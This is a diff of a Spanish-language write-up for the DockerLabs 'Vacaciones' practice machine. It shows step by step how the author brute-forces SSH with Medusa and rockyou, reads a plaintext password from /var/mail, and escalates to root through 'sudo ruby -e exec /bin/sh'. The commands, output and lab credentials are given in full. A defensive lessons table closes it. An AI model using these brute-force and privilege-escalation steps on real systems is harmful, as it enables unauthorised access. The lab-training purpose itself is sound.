@@ -1,80 +1,197 @@
-# VACACIONES — DockerLabs
+# Vacaciones — DockerLabs
 
 **Plataforma:** DockerLabs  
 **Dificultad:** 🔵 Muy Fácil  
 **SO:** Linux  
+**Autor de la máquina:** Romabri  
+**Fecha de creación:** 04/06/2024  
+**Técnicas:** Nmap · Comentario HTML · Medusa · SSH · /var/mail · Privesc (ruby/sudo)
 
 ---
 
-## Resumen
+## Índice
 
-Resolución de la máquina **VACACIONES** de DockerLabs.
+1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
+2. [Enumeración web — usuarios en el código fuente](#2-enumeración-web--usuarios-en-el-código-fuente)
+3. [Acceso inicial — fuerza bruta SSH con Medusa](#3-acceso-inicial--fuerza-bruta-ssh-con-medusa)
+4. [Movimiento lateral — correo de juan a camilo](#4-movimiento-lateral--correo-de-juan-a-camilo)
+5. [Escalada de privilegios](#5-escalada-de-privilegios)
+6. [Lección aprendida](#6-lección-aprendida)
 
 ---
 
-## 1. Reconocimiento
+## 1. Despliegue y reconocimiento
 
-Lo primero que haremos será desplegar el contenedor donde está la maquina
-vulnerable.
+```bash
+sudo bash auto_deploy.sh vacaciones.tar
+```
 
-Una vez desplegada, haremos un ping para comprobar que tenemos conexión,
-podemos ver por el ttl que es una maquina Linux
+> IP asignada: `172.17.0.2`. El TTL de 64 en el ping confirma que es Linux.
 
-Haremos un escaneo simple para comprobar que puertos están abiertos y -Pn
-para que no detecte que nuestro host tiene conexión.
+```bash
+ping -c 2 172.17.0.2
+```
 
-## 2. Enumeración
+```
+64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.049 ms
+64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.029 ms
+```
 
-Una vez comprobamos que puertos están abiertos podemos hacer una búsqueda
-más detallada especificando los puertos con -p y ver la versión con -sCV.
+Escaneo inicial:
 
-Vamos a ver que contiene el servidor web y vemos una página en blanco donde
-inspeccionaremos el código de esta, podemos ver un comentario de juan para
-camilo que ha dejado un correo importante.
+```bash
+nmap -Pn 172.17.0.2
+```
 
-Como ya contamos con dos posibles usuarios haremos un ataque de fuerza bruta.
-Primero crearemos un archivo .txt donde estén estos dos usuarios.
+```
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+```
 
-## 3. Explotación
+Escaneo con versiones:
 
-Haremos el ataque con medusa ya que podremos ver los paquetes uno a uno y si
-para alguno de los dos usuarios se resuelve y así intenta con el otro.
+```bash
+nmap -p22,80 -sCV -Pn 172.17.0.2
+```
 
-Podemos ver que capturo la contraseña de camilo que es password1 y continua
-con la búsqueda del usuario juan.
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+```
 
-Ahora ingresaremos por ssh con el usuario camilo.
+---
 
-## 4. Post-explotación
+## 2. Enumeración web — usuarios en el código fuente
 
-Intentamos ver si tenemos algún privilegio con sudo -l y vemos que no
+La web devuelve una página en blanco. Inspeccionamos el código fuente (Ctrl+U):
 
-Explorando un poco podremos ver que contamos con 3 usuarios, camilo, juan y
-pedro, podríamos intentar hacer un ataque a pedro buscando su contraseña de
-igual manera con medusa o con hydra.
+```html
+<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
+```
 
-Recordemos que a camilo juan le envió un correo así que podríamos revisar el
-directorio /var/mail que suele contener los buzones de correo de los usuarios
-locales del sistema.
-Como podemos ver es el mensaje de juan para camilo con su contraseña.
+> 💡 **Los comentarios HTML son visibles para cualquiera.** Este comentario nos da dos usuarios: **juan** y **camilo**, y nos informa de que hay un correo interno importante.
+
+---
+
+## 3. Acceso inicial — fuerza bruta SSH con Medusa
+
+Creamos un fichero con los dos usuarios:
+
+```bash
+echo -e "camilo\njuan" > usuarios.txt
+```
+
+Lanzamos Medusa — muestra los intentos uno a uno y para al encontrar cada contraseña:
+
+```bash
+medusa -U usuarios.txt -P ~/Descargas/rockyou.txt -h 172.17.0.2 -M ssh
+```
+
+```
+ACCOUNT FOUND: [ssh] Host: 172.17.0.2 User: camilo Password: password1 [SUCCESS]
+```
+
+Contraseña encontrada: **camilo:password1**. Conectamos:
+
+```bash
+sudo ssh camilo@172.17.0.2
+```
+
+```
+$ whoami
+camilo
+```
+
+---
+
+## 4. Movimiento lateral — correo de juan a camilo
+
+Verificamos si camilo tiene sudo:
+
+```bash
+$ sudo -l
+Sorry, user camilo may not run sudo on 43d78581682a.
+```
+
+No tiene. Enumeramos usuarios del sistema:
+
+```bash
+$ cd /home && ls
+camilo  juan  pedro
+```
+
+El comentario HTML decía que juan dejó un correo a camilo. Revisamos `/var/mail`:
+
+```bash
+$ cd /var/mail/camilo && cat correo.txt
+Hola Camilo,
+
+Me voy de vacaciones y no he terminado el trabajo que me dio el jefe.
+Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
+```
+
+> 💡 **`/var/mail`** almacena los buzones de correo locales de cada usuario. Es un lugar frecuentemente ignorado en los CTFs pero puede contener credenciales en texto claro.
+
+Conectamos como juan con la contraseña del correo:
+
+```bash
+sudo ssh juan@172.17.0.2
+```
+
+```
+juan@172.17.0.2's password: 2k84dicb
+$ whoami
+juan
+```
+
+---
 
 ## 5. Escalada de privilegios
 
-Ahora con las credenciales de juan podremos acceder por ssh.
-Podemos comprobar de nuevo con sudo -l si tenemos privilegios y poder así
-escalar hasta ser usuario root
+Comprobamos permisos sudo de juan:
 
-Buscaremos en gtfobins si podemos con este binario escalar privilegios
+```bash
+$ sudo -l
+```
 
-Ejecutamos el comando y podemos ver que ahora somos root.
+```
+User juan may run the following commands on 43d78581682a:
+    (ALL) NOPASSWD: /usr/bin/ruby
+```
 
-## 6. Lección aprendida
+juan puede ejecutar **ruby como root sin contraseña**. GTFObins nos da el comando:
 
-Esta máquina enseña a encadenar técnicas de reconocimiento, enumeración y explotación para comprometer un sistema Linux y escalar hasta root.
+```bash
+$ sudo ruby -e 'exec "/bin/sh"'
+# whoami
+root
+```
 
-> 💡 **Consejo para principiantes:** Si te atascas, vuelve al paso de enumeración — casi siempre hay algo que no viste la primera vez.
+> 💡 **`exec "/bin/sh"`** reemplaza el proceso de ruby por una shell. Como ruby corre como root, la shell también es root.
+
+✅ Somos **root**.
 
 ---
 
-*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs*  
+## 6. Lección aprendida
+
+| Vulnerabilidad | Dónde | Impacto |
+|----------------|-------|---------|
+| **Usuarios en comentario HTML** | Código fuente de la web | Enumeración sin autenticación |
+| **Contraseña débil en SSH** | Usuario camilo | Fuerza bruta exitosa |
+| **Contraseña en correo local en texto plano** | `/var/mail/camilo/correo.txt` | Movimiento lateral a juan |
+| **ruby con sudo sin restricción** | `/usr/bin/ruby` | Escalada a root |
+
+**Para defenderse:**
+- Nunca incluir información sensible en comentarios HTML — son públicos.
+- "password1" aparece en el top 10 de cualquier diccionario. Usar contraseñas fuertes.
+- Los correos con credenciales deben usar cifrado o enviarse por canales seguros.
+- Auditar regularmente los permisos sudo de todos los usuarios.
+
+---
+
+*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
 *¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
